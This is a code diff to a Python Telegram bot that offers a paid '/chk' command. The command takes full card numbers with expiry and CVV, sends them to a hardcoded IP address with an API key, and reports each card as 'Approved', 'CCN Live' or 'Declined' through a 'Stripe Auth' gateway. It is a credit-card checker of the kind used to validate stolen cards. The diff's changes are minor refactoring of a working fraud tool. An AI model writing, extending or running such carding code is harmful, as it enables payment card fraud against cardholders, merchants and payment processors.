@@ -996,13 +996,12 @@ from telegram.ext import ContextTypes
 import aiohttp
 
 from db import get_user, update_user
-from defs import charge_resp  # Ensure defs.py has charge_resp
+from defs import charge_resp
 
 user_cooldowns = {}
 
-# Enforce cooldown per user
-async def enforce_cooldown(user_id: int, update: Update) -> bool:
-    cooldown_seconds = 5
+# Cooldown checker
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
     last_run = user_cooldowns.get(user_id, 0)
     now = datetime.now().timestamp()
     if now - last_run < cooldown_seconds:
@@ -1014,7 +1013,7 @@ async def enforce_cooldown(user_id: int, update: Update) -> bool:
     user_cooldowns[user_id] = now
     return True
 
-# Deduct user credit
+# Deduct credit
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
@@ -1022,27 +1021,27 @@ async def consume_credit(user_id: int) -> bool:
         return True
     return False
 
-# Dummy synchronous BIN lookup
+# Sync BIN lookup (simulated)
 def get_bin_details_sync(bin_number: str) -> dict:
-    time.sleep(1.5)
+    time.sleep(1.5)  # Simulate API delay
     return {
         "scheme": "Visa",
         "type": "Credit",
         "country_name": "United States"
     }
 
-# Background task for single card check
+# Background processing
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
     start_time = time.time()
     try:
-        # BIN lookup
+        # BIN lookup in separate thread
         bin_number = parts[0][:6]
         bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
         brand = (bin_details.get("scheme") or "N/A").upper()
         issuer = (bin_details.get("type") or "N/A").upper()
         country_name = (bin_details.get("country_name") or "N/A").upper()
 
-        # API call
+        # API request
         api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=25) as resp:
@@ -1053,12 +1052,10 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         api_card = data.get("card", cc_normalized)
         raw_result = data.get("result", "Declined")
 
-        # Parse result using defs.py
+        # Format result
         api_result = await charge_resp(raw_result)
-        # Remove emojis from result
         api_result_clean = api_result.replace("✅", "").replace("❌", "").strip()
 
-        # Determine header
         if "Approved" in api_result_clean or "Payment Method Successfully Added" in api_result_clean:
             header = "❖❖❖[ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ]❖❖❖"
         elif "CCN Live" in api_result_clean:
@@ -1069,13 +1066,13 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             header = "❖❖❖[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ]❖❖❖"
 
         time_taken = round(time.time() - start_time, 2)
-        formatted_response = f"_{escape_markdown(api_result_clean, version=2)}_"
 
+        # Final message
         final_text = (
             f"{header}\n"
             f"✘ Card        ➜ `{api_card}`\n"
             "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
-            f"✘ Result      ➜ {formatted_response}\n"
+            f"✘ Result      ➜ _{escape_markdown(api_result_clean, version=2)}_\n"
             "――――――――――――――――\n"
             f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
             f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
@@ -1100,19 +1097,22 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
-    # Enforce 5-second cooldown
+    # Cooldown
     if not await enforce_cooldown(user_id, update):
         return
 
+    # User check
     user_data = await get_user(user_id)
     if not user_data:
         await update.effective_message.reply_text("❌ Could not fetch user data.")
         return
 
+    # Credits check
     if user_data.get("credits", 0) <= 0:
         await update.effective_message.reply_text("❌ You have no credits left.")
         return
 
+    # Card format check
     if not context.args or "|" not in context.args[0]:
         await update.effective_message.reply_text("Usage: /chk number|mm|yy|cvv")
         return
@@ -1127,20 +1127,22 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parts[2] = parts[2][-2:]
     cc_normalized = "|".join(parts)
 
+    # Deduct credit
     if not await consume_credit(user_id):
         await update.effective_message.reply_text("❌ No credits left.")
         return
 
+    # Processing message
     processing_msg = await update.effective_message.reply_text(
         f"═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
         f"• 𝘾𝙖𝙧𝙙 ➜ `{cc_normalized}`\n"
-        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘶𝘁𝗵\n"
         "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
         "═════════════════════",
         parse_mode=ParseMode.MARKDOWN_V2
     )
 
-    # Run background check
+    # Run background task
     asyncio.create_task(background_check(cc_normalized, parts, user, user_data, processing_msg))
 
 
